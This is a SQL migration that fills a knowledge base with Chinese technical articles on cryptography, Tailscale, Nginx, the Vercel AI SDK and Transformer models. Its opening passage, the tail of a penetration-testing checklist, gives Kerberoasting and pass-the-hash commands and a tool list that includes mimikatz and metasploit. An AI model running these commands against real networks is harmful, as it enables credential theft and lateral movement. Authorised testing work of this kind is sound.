GetUserSPNs.py -request -dc-ip 10.0.0.1 corp.local/user:pass
# PTH
impacket-wmiexec -hashes :NTLM corp.local/user@10.0.0.5
```

## 九、报告与复测
- **结构**：摘要 → 影响范围 → 发现（漏洞+证据+修复）→ 风险矩阵 → 附录。
- **证据**：截图 + 请求响应 + 复现步骤，让客户 QA 能复现。
- **风险评级**：CVSS 3.1 评分。
- **复测**：客户修完后回归，确认漏洞关闭，归档。

## 十、工具清单速查

| 阶段 | 工具 |
|---|---|
| OSINT | amass / subfinder / waybackurls / theHarvester |
| 扫描 | nmap / masscan / naabu |
| Web | ffuf / gobuster / nuclei / burp / zapproxy |
| 注入 | sqlmap |
| 漏洞利用 | metasploit / searchsploit / exploits/ |
| 提权 | linpeas / winpeas / GTFOBins |
| 凭据 | hashcat / john / mimikatz / impacket |
| 隧道 | chisel / ligolo-ng / frp |
$md$ where slug = 'sec-pentest-process-checklist';

update public.kb_entries set content = $md$# 密码学工程应用：哈希/对称/签名怎么选

## 一、用途与选型总表

| 需求 | 算法 | 用途 | 备注 |
|---|---|---|---|
| 完整性校验 | SHA-256 / SHA-3 | 文件/消息指纹 | 不要用 MD5/SHA1 |
| 密码存储 | bcrypt / argon2 / scrypt | 慢哈希 + 盐 | 不要用 SHA 直接存 |
| 对称加密 | AES-256-GCM | 加密数据 | 一次性给密文+tag+IV |
| 对称块 | ChaCha20-Poly1305 | 移动/无 AES-NI | TLS 1.3 备选 |
| 密钥交换 | ECDH / X25519 | 协商会密钥 | 前向保密 |
| 数字签名 | Ed25519 / ECDSA P-256 | 验真伪、不可抵赖 | Ed25519 更快更稳 |
| 随机数 | CSPRNG (crypto.randomBytes) | 生成 IV/盐/密钥 | 不要用 Math.random |

## 二、哈希
```javascript
const crypto = require('crypto');
const h = crypto.createHash('sha256').update('hello').digest('hex');
// '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824'

// HMAC（带密钥的哈希，用于签名 API）
const mac = crypto.createHmac('sha256', secret).update(payload).digest('hex');
```
**口诀**：MD5/SHA1 已破解，新项目一律 SHA-256 起步；密码别直接哈希，上 bcrypt。

## 三、密码存储
```javascript
const bcrypt = require('bcrypt');
const hash = bcrypt.hashSync('p@ss', 10);   // 10 = cost factor
bcrypt.compareSync('p@ss', hash);          // true
```
- bcrypt 自带盐，cost 因子 10 约 100ms，调到 12 更稳。
- argon2id 是 OWASP 首选（抗 GPU）。
- 找回密码：发一次性 token，不要存明文。

## 四、对称加密 AES-GCM
GCM 是 AEAD：同时给机密性 + 完整性，IV 不保密但要随机且不重复。

```javascript
const { createCipheriv, createDecipheriv, randomBytes } = crypto;

function encrypt(key, plaintext) {
  const iv = randomBytes(12);                  // 96-bit IV（GCM 推荐）
  const c = createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([c.update(plaintext), c.final()]);
  const tag = c.getAuthTag();                  // 16 字节认证标签
  return Buffer.concat([iv, tag, ct]).toString('base64');
}

function decrypt(key, b64) {
  const buf = Buffer.from(b64, 'base64');
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const ct = buf.subarray(28);
  const d = createDecipheriv('aes-256-gcm', key, iv);
  d.setAuthTag(tag);
  return Buffer.concat([d.update(ct), d.final()]).toString();
}
```
坑：**IV 绝对不能复用**（同密钥同 IV → GCM 完全崩塌）；密钥用 KMS 或随机生成，别硬编码。

## 五、非对称密钥交换 ECDH
```javascript
const { generateKeyPairSync, diffieHellman } = crypto;
const a = generateKeyPairSync('x25519');
const b = generateKeyPairSync('x25519');
const sharedA = diffieHellman({
  privateKey: a.privateKey,
  publicKey: b.publicKey,
});
const sharedB = diffieHellman({
  privateKey: b.privateKey,
  publicKey: a.publicKey,
});
// sharedA === sharedB，可派生会话密钥
```
X25519 是固定曲线，比参数化曲线抗故障；HTTPS/SSH/Signal 都用它做密钥交换。

## 六、数字签名 Ed25519
```javascript
const { generateKeyPairSync, sign, verify } = crypto;
const kp = generateKeyPairSync('ed25519');
const msg = Buffer.from('hello');

const sig = sign(null, msg, kp.privateKey);
// 验证方用公钥
const ok = verify(null, msg, kp.publicKey, sig);  // true
```
- 私钥签，公钥验。
- Ed25519 签名 64B，速度快、抗侧信道。
- JWT 用 RS256（RSA 私钥签），密钥小、生态成熟；EdDSA 是新趋势。

## 七、RSA
```javascript
const { generateKeyPairSync, publicEncrypt, privateDecrypt } = crypto;
const rsa = generateKeyPairSync('rsa', { modulusLength: 2048 });
const ct = publicEncrypt({
  key: rsa.publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
}, Buffer.from('secret'));
const pt = privateDecrypt({
  key: rsa.privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING
}, ct);
```
- RSA 加密小数据（如对称密钥），不直接加密大块数据。
- 2048 位已不安全，新项目用 3072 起步或直接上 ECC。
- 签名用 PSS 而非 PKCS1v15。

## 八、TLS 与 HTTPS 复用
不用自己搓握手，直接 HTTPS / TLS 1.3 即可。生产自研协议时优先复用 Noise（Signal 用的协议）或 TLS 1.3。

## 九、常见反模式
- 自创算法 / 自创协议（**Don't roll your own crypto**）。
- 用 ECB 模式（同明文→同密文，模式泄露）。
- IV 用固定值或计数器没防错位。
- 私钥入 Git / 日志。
- 用 `Math.random()` 生成密钥（非 CSPRNG）。
$md$ where slug = 'sec-crypto-engineering-selection';

-- ============ 运维与效率 ============

update public.kb_entries set content = $md$# Tailscale 组网笔记：设备互联与子网路由

## 一、WireGuard 原理
WireGuard 是现代 VPN 协议：UDP + ChaCha20-Poly1305 + Curve25519 + BLAKE2s + SipHash。
- 每节点一对 Curve25519 密钥，公钥即身份。
- 1-RTT 握手建立对称密钥，无状态化设计。
- 内核态实现，性能比 OpenVPN 高一个数量级。
- 配置极简，没有 OpenSSL / 证书地狱。

但 WireGuard 原生要管 IP 分配、密钥分发、NAT 穿透，运维负担重 → **Tailscale 把这些自动化了**。

## 二、Tailscale 控制平面
```
节点 A ──┐                     ┌── 节点 B
         │   ↘             ↙    │
         │   Coordination Server │
         │   (Tailscale 控制平面) │
         │   ↗             ↲    │
节点 C ──┘                     └── 节点 D
```
- 控制平面（SaaS 或自建 `headscale`）分发公钥、IP、ACL。
- 数据平面 P2P 直连：节点间优先打洞（NAT traversal），打不通才走中继 DERP。
- 身份认证对接 OIDC（Google/Microsoft/GitHub），不存密码。
- MagicDNS：节点名 → 100.x.y.z 内网 IP，免记 IP。

## 三、安装与登录
```bash
# Linux
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up
# 浏览器登录 → 设备加入 tailnet

# 状态
tailscale status
tailscale ip           # 本节点 IP
```
默认每个节点拿到 100.64.0.0/10 段的一个 IP，节点间可直接 `ping nodeB`、`ssh user@nodeB`。

## 四、子网路由（Subnet Router）
让一台机器把它能访问的内网网段暴露给整个 tailnet：
```bash
# 路由器节点：宣告能转发 192.168.1.0/24
sudo tailscale up --advertise-routes=192.168.1.0/24
# 控制台批准（或 --accept-routes 在客户端）
sudo tailscale up --accept-routes
```
之后 tailnet 内任意设备访问 192.168.1.x 都会经路由器节点转发。常用于把家里/办公室旧设备接入云上集群。

## 五、Exit Node（出口节点）
把流量全部从某节点出 Internet，类似传统 VPN 出口：
```bash
# 出口节点声明
sudo tailscale up --advertise-exit-node
# 客户端启用
sudo tailscale up --exit-node=<ip>
# 或在客户端 GUI 勾选 Use exit node
```
适用：出差时强制走家里出口（解锁区域内容、固定出口 IP）。

## 六、ACL 规则
在 Tailscale Admin 的 ACL 文件（JSON）里定义谁能访问谁：
```json
{
  "acls": [
    { "action": "accept",
      "src": ["group:devs"],
      "dst": ["tag:prod:22", "tag:prod:443"] },
    { "action": "accept",
      "src": ["group:devs"],
      "dst": ["tag:office:*"] },
    { "action": "deny",
      "src": ["*"],
      "dst": ["tag:prod:*"] }
  ],
  "groups": {
    "group:devs": ["user@example.com"]
  },
  "tagOwners": {
    "tag:prod": ["group:devs"],
    "tag:office": ["group:devs"]
  }
}
```
- 默认 deny，需显式 accept。
- tag 比用户名更稳定（人员变动不影响标签）。
- SSH（22）、数据库（5432）等只对 dev 组开，最小授权。

## 七、自建控制平面 headscale
```bash
# headscale（开源，替代 Tailscale SaaS）
docker run -d --name headscale -v config:/etc/headscale -p 8080:8080 \
  headscale/headscale serve
# 节点登录
tailscale up --login-server http://headscale.local:8080
```
适用：合规要求 / 离线环境 / 不想被 Tailscale SaaS 限免额度。

## 八、实战经验
- **端口**：UDP 41641，强网环境常需在路由器放行。
- **NAT 打洞**：UPnP / 端口预测；对称 NAT 走 DERP 中继（会慢）。
- **DNS 漏洞**：默认 `100.100.100.100` 是 MagicDNS，别污染。
- **重启不丢**：systemd 的 `tailscaled` 开机自启；up 时加 `--reset` 清旧状态。
- **审计**：控制台可看每节点登录历史与 ACL 命中。
$md$ where slug = 'ops-tailscale-subnet-exit-node';

update public.kb_entries set content = $md$# Nginx 反向代理与 HTTPS 配置模板

## 一、完整 nginx.conf 模板
```nginx
user  nginx;
worker_processes auto;                 # 与 CPU 核数一致
worker_rlimit_nofile 65535;
pid   /var/run/nginx.pid;

events {
  worker_connections 65535;
  use epoll;                            # Linux
  multi_accept on;
}

http {
  include       mime.types;
  default_type  application/octet-stream;

  # ---- 基础 ----
  server_tokens off;                    # 隐藏版本
  sendfile on;
  tcp_nopush on;
  tcp_nodelay on;
  keepalive_timeout 65;
  keepalive_requests 1000;
  types_hash_max_size 2048;
  client_max_body_size 50m;
  large_client_header_buffers 4 16k;

  # ---- 日志 ----
  log_format main '$remote_addr - $remote_user [$time_local] '
                  '"$request" $status $body_bytes_sent '
                  '"$http_referer" "$http_user_agent" '
                  'rt=$request_time uct=$upstream_connect_time '
                  'urt=$upstream_response_time';
  access_log /var/log/nginx/access.log main;
  error_log  /var/log/nginx/error.log warn;

  # ---- gzip ----
  gzip on;
  gzip_min_length 1k;
  gzip_comp_level 5;
  gzip_types text/plain text/css application/json application/javascript
             text/xml application/xml application/xml+rss text/javascript image/svg+xml;
  gzip_vary on;

  # ---- 限流 ----
  limit_req_zone $binary_remote_addr zone=req:10m rate=10r/s;
  limit_conn_zone $binary_remote_addr zone=conn:10m;

  # ---- 上游 ----
  upstream blog_backend {
    least_conn;
    server 127.0.0.1:8080 max_fails=3 fail_timeout=10s;
    server 127.0.0.1:8081 max_fails=3 fail_timeout=10s;
    keepalive 32;
  }

  # ---- 缓存 ----
  proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=apicache:10m
                   max_size=1g inactive=10m use_temp_path=off;

  # ---- HTTP → HTTPS ----
  server {
    listen 80;
    server_name example.com www.example.com;
    return 301 https://$host$request_uri;
  }

  # ---- 主站点 ----
  server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name example.com;

    # SSL
    ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 1.1.1.1 8.8.8.8 valid=300s ipv6=off;
    add_header Strict-Transport-Security "max-age=63072000" always;
    add_header X-Frame-Options SAMEORIGIN;
    add_header X-Content-Type-Options nosniff;
    add_header Referrer-Policy strict-origin-when-cross-origin;

    # 根 → 反代后端
    location / {
      proxy_pass http://blog_backend;
      proxy_http_version 1.1;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;

      # WebSocket
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection "upgrade";
      proxy_read_timeout 3600s;
      proxy_send_timeout 3600s;

      # 限流
      limit_req zone=req burst=20 nodelay;
      limit_conn conn 50;
    }

    # 静态文件强缓存
    location ~* \.(?:js|css|png|jpg|jpeg|gif|ico|svg|woff2?|ttf)$ {
      root /var/www/blog/dist;
      expires 30d;
      add_header Cache-Control "public, max-age=2592000, immutable";
      access_log off;
    }

    # API 缓存（GET 才缓存）
    location /api/public/ {
      proxy_cache apicache;
      proxy_cache_key "$scheme$host$request_uri";
      proxy_cache_valid 200 10m;
      proxy_cache_valid 404 1m;
      add_header X-Cache-Status $upstream_cache_status;
      proxy_pass http://blog_backend;
    }

    # 健康检查放行
    location = /healthz { proxy_pass http://blog_backend/health; access_log off; }
  }
}
```

## 二、性能调优要点
| 参数 | 推荐 | 说明 |
|---|---|---|
| worker_processes | auto | 匹配 CPU 核 |
| worker_connections | 65535 | 高并发必调 |
| worker_rlimit_nofile | 65535 | 文件句柄上限 |
| keepalive_timeout | 65 | 长连接保活 |
| client_max_body_size | 50m | 文件上传 |
| proxy_http_version | 1.1 | 复用后端连接 |

```bash
# 系统侧配套
ulimit -n 65535
sysctl -w net.core.somaxconn=65535
sysctl -w net.ipv4.tcp_tw_reuse=1
```

## 三、502 / 504 排查
**502 Bad Gateway**：Nginx 联系不上后端。
- 后端进程挂了 → `systemctl status blog`、看日志。
- 端口不对 → `ss -tlnp | grep 8080`。
- SELinux 拦截 → `setsebool -P httpd_can_network_connect 1`。

**504 Gateway Timeout**：后端太慢。
- 看后端日志与 P99。
- 临时调大 `proxy_read_timeout`。
- 排查上游是否有死锁 / DB 慢查询。

## 四、证书自动续期
```bash
sudo certbot --nginx -d example.com -d www.example.com
sudo systemctl list-timers | grep certbot
# 测续期（dry-run，不真改）
sudo certbot renew --dry-run
```
Let's Encrypt 90 天证书，certbot timer 自动续。

## 五、热加载与回滚
```bash
sudo nginx -t               # 测试配置
sudo nginx -s reload        # 平滑重载（不停服）
# 灰度：先改 upstream 加新版本，旧版本 weight=0
```

## 六、安全清单
- 禁用 `ssl` 老 TLS，仅留 1.2/1.3。
- HSTS 至少 6 个月。
- 隐藏 `server_tokens`。
- 限制 `request methods`：只放 GET/POST/PUT/DELETE。
- 限流按业务分桶，登录接口更严。
$md$ where slug = 'ops-nginx-reverse-proxy-template';

update public.kb_entries set content = $md$# Vercel AI SDK 与 AI Gateway 上手

## 一、为什么用 AI SDK
- 统一接口：generateText / streamText 一个函数切换 OpenAI / Anthropic / Google 等所有模型。
- 流式输出：自动处理 SSE，前端打字机效果只需 for await (const part of result.textStream)。
- 结构化输出：generateObject({ schema }) 配合 Zod 自动校验返回 JSON。
- 多模态：文本、图片、文件输入统一 message 数组。

## 二、安装与最小示例
```bash
npm install ai @ai-sdk/openai
# 或用 Vercel AI Gateway（一个 key 调所有模型）
npm install ai @ai-sdk/vercel
```
```js
import { generateText } from 'ai';
import { openai } from '@ai-sdk/openai';

const result = await generateText({
  model: openai('gpt-4o'),
  prompt: '用一句话解释什么是 Transformer',
});
console.log(result.text);
```

## 三、流式输出（打字机效果）
```js
import { streamText } from 'ai';

const result = await streamText({
  model: openai('gpt-4o'),
  messages: [{ role: 'user', content: '讲个笑话' }],
});

for await (const part of result.textStream) {
  process.stdout.write(part);
}
```
- 前端 Vue 中用 ReadableStream + EventSource 对接，本站星途助手同款体验。

## 四、结构化输出
```js
import { generateObject } from 'ai';
import { z } from 'zod';

const { object } = await generateObject({
  model: openai('gpt-4o'),
  schema: z.object({
    name: z.string(),
    ingredients: z.array(z.string()),
    steps: z.array(z.string()),
  }),
  prompt: '生成番茄炒蛋的菜谱',
});
```

## 五、Vercel AI Gateway（一个 Key 调全部模型）
- 注册 Vercel → Settings → AI Gateway 获取 API Key。
- 把 @ai-sdk/vercel 替代各家 SDK，一个 base URL 调所有模型。
```js
import { createOpenAI } from '@ai-sdk/openai';

const vercel = createOpenAI({
  baseURL: 'https://ai-gateway.vercel.app/v1',
  apiKey: process.env.AI_GATEWAY_KEY,
});

const result = await generateText({
  model: vercel('gpt-4o'),
  prompt: 'Hello',
});
```
- 网关侧做 provider 故障转移（主用一家、备用一家）。
- 支持缓存、限流、日志，不用在应用层实现。

## 六、评估模型：Jev
```js
import { experimental_evaluate as evaluate } from 'ai';
const result = await evaluate({
  model: 'typesafe-ai/jev',
  state: '客服已为客户办理全额退款',
  questions: { refunded: { type: 'boolean', instructions: '是否发生了退款?' } },
});
```
- Jev 是 TypeSafe AI 的评估模型，返回选项/评分/布尔概率。
- 适合分类、路由、评分卡与自动校验，网关内免费、32K 上下文。

## 七、工程建议
- provider 故障转移：网关侧配置主备模型，一家超时自动切。
- 结构化任务优先用 schema 模型：比让通用模型尽量输出 JSON 稳得多。
- 流式 + 中断：用 AbortController 让用户能停掉长回答。
- Token 监控：result.usage.totalTokens 计费用，日志里留 trace。
- Prompt 版本管理：当配置管理，不要硬编码在业务代码里。
$md$ where slug = 'ai-vercel-ai-sdk-gateway';

-- ============ 前沿技术 ============

update public.kb_entries set content = $md$# Transformer 与大模型应用核心概念

## 一、注意力机制数学推导
Self-Attention 让序列中每个 token 关注所有 token，加权聚合得到上下文表征。

输入序列 $X \in \mathbb{R}^{n \times d}$，三个权重矩阵 $W^Q, W^K, W^V \in \mathbb{R}^{d \times d_k}$：

$$Q = X W^Q,\quad K = X W^K,\quad V = X W^V$$

注意力分数：
$$\text{Attention}(Q,K,V) = \text{softmax}\!\left(\frac{Q K^\top}{\sqrt{d_k}}\right) V$$

- $QK^\top$ 是 $n \times n$ 的相似度矩阵，每行表示该 token 对所有 token 的关注。
- $\sqrt{d_k}$ 防止点积过大让 softmax 进饱和区。
- softmax 归一化为权重，再加权求和 V 得到输出。

直觉：每个 token 是一个 query，去问所有 key "我该看谁"，权重决定取多少 value。

## 二、位置编码
Attention 本身是集合操作，没有顺序信息。要注入位置：
- **绝对位置编码（原版）**：固定正弦/余弦 `PE(pos, 2i) = sin(pos/10000^(2i/d))`。
- **可学习位置编码（GPT/BERT）**：每个位置一个可训练向量。
- **相对位置（T5/Transformer-XL）**：偏置加到 attention logits。
- **RoPE（旋转位置编码，LLaMA 系列）**：用旋转矩阵同时编码相对位置，外推性好。

## 三、多头注意力（Multi-Head）
把 $d$ 维拆成 $h$ 个头，每个头独立做 attention，最后拼接再投影：
$$\text{MHA}(X) = \text{Concat}(\text{head}_1, \dots, \text{head}_h) W^O$$
$$\text{head}_i = \text{Attention}(X W_i^Q, X W_i^K, X W_i^V)$$
- 不同头学不同关系（语法、共指、长程依赖）。
- 参数量与单头相同（每个头维度 $d/h$），算力近似不变。
- LLaMA-7B 用 32 头，GPT-3 175B 用 96 头。

## 四、LayerNorm 与残差
```python
class Block(nn.Module):
    def __init__(self, d, h):
        self.ln1 = nn.LayerNorm(d)
        self.attn = nn.MultiheadAttention(d, h, batch_first=True)
        self.ln2 = nn.LayerNorm(d)
        self.ff = nn.Sequential(
            nn.Linear(d, 4*d), nn.GELU(), nn.Linear(4*d, d))
    def forward(self, x):
        a, _ = self.attn(self.ln1(x), self.ln1(x), self.ln1(x), need_weights=False)
        x = x + a                     # 残差
        x = x + self.ff(self.ln2(x))  # 残差
        return x
```
- **残差连接**：`x + sublayer(x)`，让梯度直通，避免深层退化。
- **LayerNorm**：按最后一维归一化，稳定训练；Pre-Norm（先 LN 再子层）比 Post-Norm 更稳。
- **RMSNorm**（LLaMA）：去掉均值项，只缩放，省算力。

## 五、最小 Transformer 前向传播（PyTorch）
```python
import torch, torch.nn as nn, torch.nn.functional as F

class MiniGPT(nn.Module):
    def __init__(self, vocab, d=256, h=4, L=4, ctx=128):
        super().__init__()
        self.tok = nn.Embedding(vocab, d)
        self.pos = nn.Embedding(ctx, d)
        self.blocks = nn.ModuleList([Block(d, h) for _ in range(L)])
        self.ln = nn.LayerNorm(d)
        self.head = nn.Linear(d, vocab, bias=False)
        self.ctx = ctx
    def forward(self, idx):
        B, T = idx.shape
        p = torch.arange(T, device=idx.device).unsqueeze(0)
        x = self.tok(idx) + self.pos(p)
        for blk in self.blocks:
            x = blk(x)
        return self.head(self.ln(x))

# 自回归生成
@torch.no_grad()
def generate(model, idx, steps=20):
    for _ in range(steps):
        logits = model(idx[:, -model.ctx:])
        next_id = logits[:, -1].argmax(-1, keepdim=True)
        idx = torch.cat([idx, next_id], dim=1)
    return idx
```
这就是 GPT 的核心：token embedding + pos embedding + N 个 Block + 线性头 + 自回归采样。LLaMA/GPT 都在此之上加大参数、改归一化、改激活、改位置编码。

## 六、KV Cache
推理时每生成一个 token，前面 token 的 K/V 不变 → 缓存起来，避免重算。
- 复杂度从 $O(n^2)$ 降到 $O(n)$（每步只算新 token）。
- 显存：`2 * L * n * d * bytes`，长上下文时是主要开销。
- vLLM 用 PagedAttention 管理碎片化 KV Cache，让多并发请求共享显存。

## 七、量化
把 float16 权重压成低位整型，省显存、提速：

| 量化 | 位宽 | 显存（7B 模型） | 精度损失 |
|---|---|---|---|
| FP16 | 16 | 14 GB | 基线 |
| INT8 | 8 | 7 GB | 小 |
| INT4 (GPTQ/AWQ) | 4 | 4 GB | 中 |
| 2-bit | 2 | 2 GB | 大 |

- 量化时校准数据很重要，AWQ 按激活重要性保护关键通道。
- 量化主要压权重；激活量化要更小心（小数值被抹平）。
- llama.cpp 用 GGUF 格式，CPU + GPU 混合推理，单机跑 70B 不是梦。

## 八、LoRA 微调
全量微调 7B 模型要 14B 参数的优化器状态（约 100GB 显存）。LoRA：
- 冻结原权重 $W$，旁挂低秩矩阵 $W + \Delta W = W + BA$，其中 $B \in \mathbb{R}^{d \times r}, A \in \mathbb{R}^{r \times d}, r \ll d$。
- 只训 $A, B$，参数量从 $d^2$ 降到 $2dr$，省 10 倍以上显存。
- 推理时可合并 $BA$ 回 $W$，零额外开销。

```python
# Hugging Face PEFT
from peft import LoraConfig, get_peft_model
cfg = LoraConfig(r=8, lora_alpha=16, target_modules=["q_proj","v_proj"],
                 lora_dropout=0.05, task_type="CAUSAL_LM")
model = get_peft_model(base, cfg)
model.print_trainable_parameters()  # ~0.1% 可训
```
QLoRA = 4bit 量化基座 + LoRA 微调，单卡 24GB 可训 70B。

## 九、训练与对齐
- **预训练**：海量文本做 next-token 预测，学语言知识。
- **SFT（监督微调）**：指令-响应对，学指令遵循。
- **RLHF / DPO**：人类偏好对齐，让回答更安全有用；DPO 省去 reward model，直接训偏好。
- **RM 奖励模型** → PPO 策略优化（老路线）；DPO 直接对比正负样本（新趋势）。

## 十、应用层关键参数
- **Token**：分词最小单位；上下文窗口 = 输入 + 输出预算。
- **temperature**：低=确定（代码/分类），高=发散（创作）。
- **top_p / top_k**：核采样与截断，控制多样性。
- **function/tool calling**：结构化让模型调用外部工具，Agent 时代的基础。
- **RAG**：检索增强，把私有知识外挂到 prompt，解决时效与幻觉。
$md$ where slug = 'ai-transformer-llm-concepts';
